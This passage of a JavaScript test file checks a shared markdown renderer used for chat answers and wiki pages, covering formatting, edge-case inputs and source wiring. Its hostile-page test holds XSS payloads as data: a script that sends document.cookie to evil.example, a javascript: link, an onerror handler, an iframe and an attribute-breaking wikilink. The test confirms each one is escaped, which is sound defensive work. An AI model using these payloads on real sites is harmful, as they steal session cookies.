  ok(/<strong>b<\/strong>/.test(renderMarkdown('**b**')), '** → <strong>');
  ok(/<strong>b<\/strong>/.test(renderMarkdown('__b__')), '__ → <strong>');
  ok(/<em>i<\/em>/.test(renderMarkdown('an *i* word')), '* → <em>');
  ok(/<em>i<\/em>/.test(renderMarkdown('an _i_ word')), '_ → <em>');
  ok(!/<em>/.test(renderMarkdown('snake_case_name here')), 'snake_case is not italicised');
  ok(/<code>x<\/code>/.test(renderMarkdown('a `x` b')), 'backticks → <code>');

  const wl = renderMarkdown('The [[concepts/rag.md]] page and [[tali-rezun|Dr. Rezun]] both apply.');
  ok(/<span class="chat-wikilink">rag<\/span>/.test(wl), 'wikilink shows readable slug (folder + .md stripped)');
  ok(/<span class="chat-wikilink">Dr\. Rezun<\/span>/.test(wl), 'aliased wikilink shows the alias');

  const cite = renderMarkdown('See [source: concepts/rag.md] for details.');
  ok(/<span class="chat-citation-tag">/.test(cite), 'citation chip rendered');
  ok(/<span class="chat-cite-path">concepts\/rag\.md<\/span>/.test(cite), 'citation path in a text-content span');
  ok(/data-icon="dot"/.test(cite), 'citation chip carries the dot icon');
  ok(iconCalls.some(([n, s]) => n === 'dot' && s === 7), 'icon() called as icon("dot", 7)');
}

// ══ 7. Defensive inputs ══════════════════════════════════════════════════
section('7. Defensive inputs');
{
  ok(renderMarkdown('') === '', 'empty string → empty');
  ok(renderMarkdown(null) === '', 'null → empty string (no throw)');
  ok(renderMarkdown(undefined) === '', 'undefined → empty string (no throw)');
  ok(renderMarkdown('plain sentence.') === '<p>plain sentence.</p>', 'plain text → one paragraph');
  ok(typeof renderMarkdown(42) === 'string', 'a number does not throw');
  ok(typeof renderMarkdown({ a: 1 }) === 'string', 'an object does not throw');
  ok(typeof renderMarkdown(['x']) === 'string', 'an array does not throw');
  const big = renderMarkdown('word '.repeat(20000));
  ok(typeof big === 'string' && big.length > 0, '100 KB of text renders without throwing');
  ok(renderMarkdown('\n\n\n') === '', 'blank lines only → empty');
  ok(typeof renderMarkdown('[[' .repeat(500)) === 'string', 'unclosed wikilink storm does not throw');
  ok(typeof renderMarkdown('`'.repeat(500)) === 'string', 'backtick storm does not throw');
}

// ══ 8. THE WIDENING — wiki page bodies as hostile input ══════════════════
// After the lift this renderer also renders wiki page bodies. Those are
// LLM-authored, hand-editable, and delivered over Personal Sync and Shared
// Brain mirrors — i.e. content another person's machine wrote. A wiki page is
// exactly the kind of document that legitimately contains raw HTML, so the
// escape-first rule has to hold on realistic page shapes, not just on chat
// prose.
section('8. Widening — realistic wiki page bodies');
{
  const page = [
    '# Retrieval-Augmented Generation',
    '',
    '## Definition',
    '',
    'RAG combines **retrieval** with *generation*. See [[vector-database]] and',
    '[[concepts/embeddings.md|embeddings]].',
    '',
    '## Key Facts',
    '',
    '- Introduced by [[meta-ai]] in 2020',
    '- Uses a `retriever` + a `generator`',
    '',
    '## Related',
    '',
    '- [[summaries/the-rag-paper]]',
  ].join('\n');
  const h = renderMarkdown(page);
  ok(/<div class="chat-md-h">Retrieval-Augmented Generation<\/div>/.test(h), 'page H1 renders as a heading');
  ok((h.match(/chat-md-h/g) || []).length === 4, 'all four headings render as headings');
  ok(/<ul>/.test(h) && (h.match(/<li>/g) || []).length === 3, 'the bullet sections render as lists');
  ok(!/^##|\*\*retrieval\*\*/m.test(h), 'no raw ## or ** markers leak into the output');
  ok((h.match(/chat-wikilink/g) || []).length === 4, 'every [[wikilink]] renders as a styled span');
  ok(/<span class="chat-wikilink">embeddings<\/span>/.test(h), 'aliased wikilink in a page body uses the alias');
  ok(/<code>retriever<\/code>/.test(h), 'inline code in a page body renders');
  ok(!hasLiveHandlerOrUrlAttr(h) && foreignTags(h).length === 0, 'a realistic page emits no foreign markup');
}
{
  // A page that arrived over a mirror carrying an injection payload. Wiki
  // bodies are hand-editable, so this is a plausible artefact, not a stunt.
  const hostile = [
    '# Innocent Title',
    '',
    'Normal prose here.',
    '',
    '<script>fetch("https://evil.example/"+document.cookie)</script>',
    '',
    '<a href="javascript:alert(1)">click me</a>',
    '',
    '<img src=x onerror="alert(1)">',
    '',
    '<iframe src="https://evil.example"></iframe>',
    '',
    '<style>body{display:none}</style>',
    '',
    '- [[a" onmouseover="alert(1)]]',
  ].join('\n');
  const h = renderMarkdown(hostile);
  ok(!/<script|<iframe|<style|<a\s/i.test(h), 'script/iframe/style/anchor from a mirrored page are all inert');
  ok(!hasLiveHandlerOrUrlAttr(h), 'no live handler or URL attribute survives a hostile page body');
  ok(foreignTags(h).length === 0, `no foreign tag from a hostile page (saw: ${foreignTags(h).join(',') || 'none'})`);
  ok(h.includes('&lt;script&gt;') && h.includes('&lt;iframe'), 'the payloads are shown as escaped text, not dropped silently');
  ok(h.includes('Normal prose here.'), 'legitimate content around the payload still renders');
}

// ══ 9. Wiring — one renderer, both surfaces ══════════════════════════════
// Behaviour above proves the renderer is safe. This section proves the two
// surfaces actually USE it — and that the wiki reader stopped shipping
// escaped source. Source-level, so it must run on comment-stripped code.
section('9. Wiring — chat and the wiki reader share ONE renderer');
{
  const chatSrc = readFileSync(P_CHAT, 'utf8');
  const domSrc = readFileSync(P_DOMAINS, 'utf8');
  const chatCode = assertStrippedSane(stripComments(chatSrc), 'chat.js',
    ['function renderThread', 'renderMarkdown(']);
  const domCode = assertStrippedSane(stripComments(domSrc), 'domains.js',
    ['async function openWikiPageFromBrowse', 'bodyHtml:']);

  ok(existsSync(P_SHARED), 'src/public/next/shared/markdown.js exists');
  if (existsSync(P_SHARED)) {
    const sharedCode = assertStrippedSane(stripComments(readFileSync(P_SHARED, 'utf8')), 'shared/markdown.js',
      ['export function renderMarkdown', 'function escHtml']);
    ok(/export function renderMarkdown/.test(sharedCode), 'the shared module EXPORTS renderMarkdown');
    ok(/import \{[^}]*\bicon\b[^}]*\} from '\.\.\/app\.js'/.test(sharedCode),
      'the shared module imports icon from the shell (no second icon table)');
  }

  ok(/import \{[^}]*renderMarkdown[^}]*\} from '\.\.\/shared\/markdown\.js'/.test(chatCode),
    'chat.js imports renderMarkdown from the shared module');
  ok(!/(?:^|\n)function renderMarkdown\s*\(/.test(chatCode),
    'chat.js no longer declares its own renderMarkdown');
  ok(!/(?:^|\n)function (?:escHtml|formatSegment|renderInline)\s*\(/.test(chatCode),
    'chat.js no longer carries the renderer\'s private helpers');
  ok(/renderMarkdown\(/.test(chatCode), 'chat.js still calls renderMarkdown (the thread + its reader)');

  ok(/import \{[^}]*renderMarkdown[^}]*\} from '\.\.\/shared\/markdown\.js'/.test(domCode),
    'domains.js imports renderMarkdown from the shared module');
  ok(!/dm-page-source/.test(domCode),
    'domains.js no longer renders the wiki body as escaped <pre> source');
  ok(/bodyHtml:\s*renderMarkdown\(/.test(domCode),
    'domains.js hands openReader() rendered markdown for the page body');
  ok(!/(?:^|\n)function renderMarkdown\s*\(/.test(domCode),
    'domains.js did not grow its own copy of the renderer');

  // Comment-stripped, and that is load-bearing: domains.css now carries a
  // note EXPLAINING that `.dm-page-source` was removed, and that note names
  // the class. A raw-text check would read the explanation and report the
  // rule as still present — the "the check stopped reaching what it
  // protects" failure, inverted.
  const domCss = assertStrippedSane(stripComments(readFileSync(P_DOMAINS_CSS, 'utf8')), 'domains.css',
    ['.dm-browse-card {', '.dm-browse-note {']);
  ok(!/\.dm-page-source/.test(domCss), 'the dead .dm-page-source RULE is gone from domains.css');

  // The classes the SHARED renderer emits must be styled for BOTH surfaces.
  // .reader-body-text is the shell's wrapper for openReader()'s bodyHtml, so
  // a rule that only reaches .chat-answer leaves the wiki reader unstyled.
  const chatCss = assertStrippedSane(stripComments(readFileSync(P_CHAT_CSS, 'utf8')), 'chat.css',
    ['.chat-md-h {', '.reader-body-text .chat-md-h']);
  for (const cls of ['chat-md-h', 'chat-wikilink', 'chat-citation-tag']) {
    ok(new RegExp('^\\.' + cls + '\\b', 'm').test(chatCss),
      `.${cls} is styled unscoped (reaches the reader as well as the bubble)`);
  }
  // The renderer emits a FOURTH class, `chat-cite-path`, and this loop
  // deliberately excludes it: it carries no styling anywhere in /next and is
  // not supposed to. It is a SELECTOR HOOK — chat.js reads the citation path
  // out of its textContent (the M3 fix) — and it inherits its appearance from
  // the `.chat-citation-tag` parent. Both chat.css's section note and
  // shared/markdown.js's header used to claim all FOUR were styled unscoped,
  // which was false; corrected, and pinned here so the claim and the
  // stylesheet cannot drift apart again in either direction.
  {
    const citePathRules = (chatCss.match(/^[^\n{]*\.chat-cite-path\b[^\n{]*\{/gm) || []);
    ok(citePathRules.length === 0 || citePathRules.every((r) => /^\s*\.chat-cite-path\b/.test(r)),
      citePathRules.length === 0
        ? '.chat-cite-path has NO rule — it is a selector hook, and both source comments now say so'
        : `.chat-cite-path gained a rule and it is scoped correctly (unscoped, so it reaches the reader): ${JSON.stringify(citePathRules)}`);
    ok(/chat-cite-path/.test(readFileSync(P_SHARED, 'utf8')) && /chat-cite-path/.test(chatSrc),
      'the class IS emitted by the renderer and IS read back by chat.js (it is live, just unstyled)');
  }
  // Anchored on the opening brace, NOT on a word boundary. Caught by mutation:
  // `/\.reader-body-text pre\b/` still matched after the `pre` rule was
  // deleted, because the neighbouring `.reader-body-text pre code { … }` rule
  // contains the same prefix — the guard stayed green over the exact deletion
  // it exists to catch. A decorative guard inside the change that adds it.
  ok(/\.reader-body-text pre \{/.test(chatCss), 'the reader body styles <pre> (a wiki page may contain a fenced block)');
  ok(/\.reader-body-text code \{/.test(chatCss), 'the reader body styles inline <code>');
  ok(/\.reader-body-text pre code \{/.test(chatCss), 'code inside a fenced block is not double-backgrounded');
}

console.log(`\n${'─'.repeat(60)}`);
console.log(`Passed: ${passed}   Failed: ${failed}`);
if (failed > 0) { console.log('❌ FAILURES'); process.exit(1); }
console.log('✅ All /next markdown offline assertions green');
process.exit(0);
